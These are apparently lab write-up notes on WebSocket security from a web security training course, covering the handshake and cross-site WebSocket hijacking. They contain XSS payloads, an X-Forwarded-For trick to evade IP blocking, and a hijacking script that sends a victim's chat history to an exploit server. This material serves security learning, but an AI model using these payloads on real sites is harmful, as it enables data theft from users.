# WebSockets
- WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.
- Messages can be sent in either direction at any time and are not transactional in nature. The connection will normally stay open and idle until either the client or the server is ready to send a message.
- To establish the connection, the browser and server perform a WebSocket handshake over HTTP.
  
Request:
 
    GET /chat HTTP/1.1
    Host: normal-website.com
    Sec-WebSocket-Version: 13
    Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
    Connection: keep-alive, Upgrade
    Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
    Upgrade: websocket

Response:

    HTTP/1.1 101 Switching Protocols
    Connection: Upgrade
    Upgrade: websocket
    Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=

Note: 
> - The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
> - The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
> - The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request, prevents errors from caching proxies, and is not used for authentication or session handling purposes.
> - The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the `Sec-WebSocket-Key` request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.

## Cross-site WebSocket hijacking
Cross-site WebSocket hijacking involves a CSRF vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

### LAB: Manipulating WebSocket messages to exploit vulnerabilities

    Messages are HTML encoded before sending to the server:
    {"message":"&lt;img src=1 onerror=alert()&gt;"}
    Capture the message in WebSockets History and change the message to:
    {"message":"<img src=1 onerror=alert()>"}

### LAB: Manipulating the WebSocket handshake to exploit vulnerabilities

    To avoid IP blocking add X-Forwarded-For header to the handshake 
    and reconnect. XSS payload:
    {"message":"<img src=1 oNERRor=alert`1`>"}

### LAB: Cross-site WebSocket hijacking
Found that:
- The WebSocket handshake remains solely on the client's cookie (no CSRF protection)
- Client sends a 'READY' message to retrieve chat's history

Use this script to make the client establish a WebSocket handshake with the server and sends the 'READY' message to receive his chat's history. Sending the server's response via the parameter in the `GET` request to our listening server:

    <script>
        const wsUrl = "wss://0ae9000d0418732880e8215000f700e2.web-security-academy.net/chat";
        const socket = new WebSocket(wsUrl);

        socket.onopen = function() {
            socket.send("READY");
        };

        socket.onmessage = function(event) {
            location = 'https://exploit-0a65008d04697309805820bc0188001a.exploit-server.net/log?msg=' + encodeURIComponent(event.data);
        };
    </script>